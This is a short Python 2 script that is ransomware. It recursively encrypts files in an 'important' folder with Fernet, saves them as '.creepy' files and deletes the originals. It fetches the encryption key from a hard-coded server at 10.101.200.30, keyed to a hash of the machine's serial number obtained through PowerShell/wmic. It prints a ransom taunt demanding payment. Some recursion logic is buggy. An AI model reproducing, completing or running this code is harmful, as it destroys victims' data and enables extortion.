import subprocess
import hashlib
import sys

from cryptography.fernet import Fernet
from requests import get
from os import listdir, getcwd, remove
from os.path import isdir

path = ".\\important"
mode = False

def r(path, mode, fn):
    for i in listdir(path):
        if isdir(i):
            r(path + "\\" + i)
        else:
            if i.split(".")[-1] == "creepy":
                if password == get("http://10.101.200.30/keys/" + getHash() + ".txt").text.encode("utf8"):
                    fn = Fernet(password)
                    decrypt(path + "\\" + i, fn)
                else:
                    print "Sorry not sorry, try again or pay for that :)"
                    sys.exit(1)
            else:
                encrypt(path + "\\" + i, fn)

def encrypt(path, fn):
    f = open(path, "r")
    f2 = open(path + ".creepy", "w+")
    f2.write(fn.encrypt(f.read().encode("utf8")))
    f.close()
    f2.close()
    remove(path)

def decrypt(path, fn):
    f = open(path, "r")
    p = path.split(".")
    del p[-1]
    f2 = open(".".join(p), "w+")
    f2.write(fn.decrypt(f.read()).decode("utf8"))
    f.close()
    f2.close()
    remove(path)

def getHash():
    p = subprocess.Popen(['powershell.exe', 'wmic csproduct get identifyingnumber'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    cs = p.stdout.read()
    h = hashlib.md5()
    h.update(cs.split('\n')[1])
    return h.hexdigest()

def checkMode(mode):
    flag = 0
    for i in listdir(path):
        if isdir(i):
            r(path + "\\" + i)
        else:
            if mode == False and i.split(".")[-1] == "creepy":
                flag+= 1
    if flag:
        return True
    else:
        return False


if not checkMode(mode):
    key = get("http://10.101.200.30/key.php?hash=" + getHash()).text.encode("utf8")
    r(getcwd() + path, mode, Fernet(key))
else:
    password = str(raw_input("Password ? ")).encode("utf8")
    try:
        fn = Fernet(password)
        r(getcwd() + path, mode, fn)
    except:
        print "Sorry not sorry, try again or pay for that :)"
    
